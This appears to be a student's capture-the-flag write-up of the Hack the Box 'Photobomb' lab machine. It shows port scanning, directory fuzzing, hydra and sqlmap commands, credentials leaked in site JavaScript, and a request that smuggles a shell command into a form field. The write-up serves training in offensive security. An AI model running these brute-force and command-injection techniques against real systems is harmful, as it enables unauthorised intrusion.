@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Felicitas Pojtinger (fp036" />
+  <meta name="author" content="Stuttgart Media University)" />
+  <meta name="dcterms.date" content="2022-10-14" />
+  <meta name="keywords" content="hdm-stuttgart, hacking" />
+  <title>Uni Hacking Report</title>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 20px;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      word-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">Uni Hacking Report</h1>
+<p class="subtitle">Hack the Box: Photobomb Machine</p>
+<p class="author">Felicitas Pojtinger (fp036</p>
+<p class="author">Stuttgart Media University)</p>
+<p class="date">2022-10-14</p>
+</header>
+<ul>
+<li><strong>Machine</strong>: Photobomb (Medium; <code>10.10.11.182</code>, https://app.hackthebox.com/machines/Photobomb)</li>
+</ul>
+<pre class="shell"><code># /etc/hosts
+10.10.11.182 photobomb.htb$</code></pre>
+<pre class="shell"><code>$ nmap -v -p- photobomb.htb
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 18:44 CEST
+Initiating Ping Scan at 18:44
+Scanning photobomb.htb (10.10.11.182) [2 ports]
+Completed Ping Scan at 18:44, 0.05s elapsed (1 total hosts)
+Initiating Connect Scan at 18:44
+Scanning photobomb.htb (10.10.11.182) [65535 ports]
+Discovered open port 80/tcp on 10.10.11.182
+Discovered open port 22/tcp on 10.10.11.182</code></pre>
+<pre class="shell"><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 14 Oct 2022 16:48:11 GMT
+Content-Type: text/html;charset=utf-8
+Connection: close
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 843</code></pre>
+<pre class="shell"><code>GET /printer HTTP/1.1
+Host: photobomb.htb
+Cache-Control: max-age=0
+Authorization: Basic YXNkZmFzZGY6c2FkZmFzZGY=
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://photobomb.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close</code></pre>
+<pre class="shell"><code>$ ffuf -w ~/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://photobomb.htb/ -H &#39;Host: FUZZ.http://photobomb.htb/&#39; -fs 0,154
+# No results
+$ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://photobomb.htb/FUZZ -fs 12193 -s
+# directory-list-2.3-small.txt
+# or send a letter to Creative Commons, 171 Second Street,
+#
+#
+# Priority-ordered case-sensitive list, where entries were found
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/
+
+# Suite 300, San Francisco, California, 94105, USA.
+#
+# on at least 3 different hosts
+#
+# Attribution-Share Alike 3.0 License. To view a copy of this
+# Copyright 2007 James Fisher
+# This work is licensed under the Creative Commons
+printer
+printers
+printerfriendly
+printer_friendly
+printer_icon
+printer-icon
+printer-friendly
+printerFriendly
+printersupplies
+printer1
+
+printer2
+# ...</code></pre>
+<p>4 4283 77468377 → Invalid number</p>
+<pre class="plaintext"><code>Sinatra doesn’t know this ditty.
+
+Try this:
+get &#39;/asdfsadfsdf&#39; do
+  &quot;Hello World&quot;
+end</code></pre>
+<p>We have a Sinatra server.</p>
+<pre class="shell"><code>$ hydra -l username -P ~/Downloads/rockyou.txt -s 80 -f photobomb.htb http-get /printer</code></pre>
+<pre class="shell"><code>sqlmap -u &#39;http://photobomb.htb/printer&#39; --auth-type=basic --auth-cred=testuser:testpass --banner -v 5</code></pre>
+<pre class="shell"><code>$ curl &#39;http://photobomb.htb/photobomb.js&#39; \
+  --compressed \
+  --insecure
+function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;);
+  }
+}
+window.onload = init;</code></pre>
+<p>User: <code>pH0t0</code> Password: <code>b0Mb!</code></p>
+<pre class="shell"><code>$ curl &#39;http://photobomb.htb/printer&#39; \
+  -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; \
+  -H &#39;Accept-Language: en-US,en;q=0.9,de;q=0.8&#39; \
+  -H &#39;Authorization: Basic cEgwdDA6YjBNYiE=&#39; \
+  -H &#39;Cache-Control: max-age=0&#39; \
+  -H &#39;Connection: keep-alive&#39; \
+  -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
+  -H &#39;Origin: http://photobomb.htb&#39; \
+  -H &#39;Referer: http://photobomb.htb/printer&#39; \
+  -H &#39;Upgrade-Insecure-Requests: 1&#39; \
+  -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#39; \
+  --data-raw &#39;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg&amp;dimensions=1000x1500&#39; \
+  --compressed \
+  --insecure</code></pre>
+<pre class="shell"><code>$ sqlmap -u &#39;http://photobomb.htb/printer&#39; --data=&quot;photo=asdf&quot; --method GET --dbs --batch -time-sec=1 --headers=&quot;Authorization: Basic cEgwdDA6YjBNYiE=&quot;
+[19:22:06] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#39;--level&#39;/&#39;--risk&#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper=space2comment&#39;) and/or switch &#39;--random-agent
+$ sqlmap -u &#39;http://photobomb.htb/printer&#39; --data=&quot;filetype=asdf&quot; --method GET --dbs --batch -time-sec=1 --headers=&quot;Authorization: Basic cEgwdDA6YjBNYiE=&quot;
+[19:22:36] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#39;--level&#39;/&#39;--risk&#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper=space2comment&#39;) and/or switch &#39;--random-agent&#39;</code></pre>
+<p>We can download files, so its probably a file inclusion. Where is the upload site? Let’s fuzz.</p>
+<pre class="shell"><code>$ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://photobomb.htb/FUZZ -fs 12193 -s -H &quot;Authorization: Basic cEgwdDA6YjBNYiE=&quot;</code></pre>
+<pre class="shell"><code>curl &#39;http://photobomb.htb/printer&#39;   -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;   -H &#39;Accept-Language: en-US,en;q=0.9,de;q=0.8&#39;   -H &#39;Authorization: Basic cEgwdDA6YjBNYiE=&#39;   -H &#39;Cache-Control: max-age=0&#39;   -H &#39;Connection: keep-alive&#39;   -H &#39;Content-Type: application/x-www-form-urlencoded&#39;   -H &#39;Origin: http://photobomb.htb&#39;   -H &#39;Referer: http://photobomb.htb/printer&#39;   -H &#39;Upgrade-Insecure-Requests: 1&#39;   -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#39;   --data-raw &#39;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg&#39;   --compressed   --insecure &gt; /tmp/asdf.html
+# Shows error message with debug information and regex, repeat with other parameters</code></pre>
+<div class="sourceCode" id="cb14"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>post <span class="vs">&#39;/printer&#39;</span> <span class="cf">do</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>  photo <span class="kw">=</span> params<span class="kw">[</span><span class="wa">:photo</span><span class="kw">]</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>  filetype <span class="kw">=</span> params<span class="kw">[</span><span class="wa">:filetype</span><span class="kw">]</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>  dimensions <span class="kw">=</span> params<span class="kw">[</span><span class="wa">:dimensions</span><span class="kw">]</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>  <span class="co"># handle inputs</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> photo<span class="at">.match</span>(<span class="ss">/\.{2}|\//</span>)</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>    halt <span class="dv">500</span>, <span class="vs">&#39;Invalid photo.&#39;</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="kw"> !</span><span class="dt">FileTest</span><span class="at">.exist?</span>( <span class="st">&quot;source_images/&quot;</span> <span class="kw">+</span> photo )</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>    halt <span class="dv">500</span>, <span class="vs">&#39;Source photo does not exist.&#39;</span></span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="kw"> !</span>filetype<span class="at">.match</span>(<span class="ss">/^(png|jpg)/</span>)</span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>    halt <span class="dv">500</span>, <span class="vs">&#39;Invalid filetype.&#39;</span></span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="kw"> !</span>dimensions<span class="at">.match</span>(<span class="ss">/^[0-9]+x[0-9]+$/</span>)</span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>    halt <span class="dv">500</span>, <span class="vs">&#39;Invalid dimensions.&#39;</span></span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>  <span class="cf">end</span></span></code></pre></div>
+<pre class="shell"><code>curl &#39;http://photobomb.htb/printer&#39;   -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;   -H &#39;Accept-Language: en-US,en;q=0.9,de;q=0.8&#39;   -H &#39;Authorization: Basic cEgwdDA6YjBNYiE=&#39;   -H &#39;Cache-Control: max-age=0&#39;   -H &#39;Connection: keep-alive&#39;   -H &#39;Content-Type: application/x-www-form-urlencoded&#39;   -H &#39;Origin: http://photobomb.htb&#39;   -H &#39;Referer: http://photobomb.htb/printer&#39;   -H &#39;Upgrade-Insecure-Requests: 1&#39;   -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#39;   --data-raw &#39;photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&amp;filetype=jpg;touch asdf-3000x2000.jpg&amp;dimensions=3000x2000&#39;   --compressed   --insecure -vvv
+*   Trying 10.10.11.182:80...
+* Connected to photobomb.htb (10.10.11.182) port 80 (#0)
+&gt; POST /printer HTTP/1.1
+&gt; Host: photobomb.htb
+&gt; Accept-Encoding: deflate, gzip, br, zstd
+&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+&gt; Accept-Language: en-US,en;q=0.9,de;q=0.8
+&gt; Authorization: Basic cEgwdDA6YjBNYiE=
+&gt; Cache-Control: max-age=0
+&gt; Connection: keep-alive
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt; Origin: http://photobomb.htb
+&gt; Referer: http://photobomb.htb/printer
+&gt; Upgrade-Insecure-Requests: 1
+&gt; User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
+&gt; Content-Length: 109
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 500 Internal Server Error
+&lt; Server: nginx/1.18.0 (Ubuntu)
+&lt; Date: Fri, 14 Oct 2022 18:18:18 GMT
+&lt; Content-Type: text/html;charset=utf-8
+&lt; Content-Length: 73
+&lt; Connection: keep-alive
+&lt; Content-Disposition: attachment; filename=wolfgang-hasselmann-RLEgmd1O7gs-unsplash_3000x2000.jpg;touch asdf-3000x2000.jpg
+&lt; X-Xss-Protection: 1; mode=block
+&lt; X-Content-Type-Options: nosniff
+&lt; X-Frame-Options: SAMEORIGIN
+&lt;
+* Connection #0 to host photobomb.htb left intact
+Failed to generate a copy of wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg</code></pre>
+</body>
+</html>
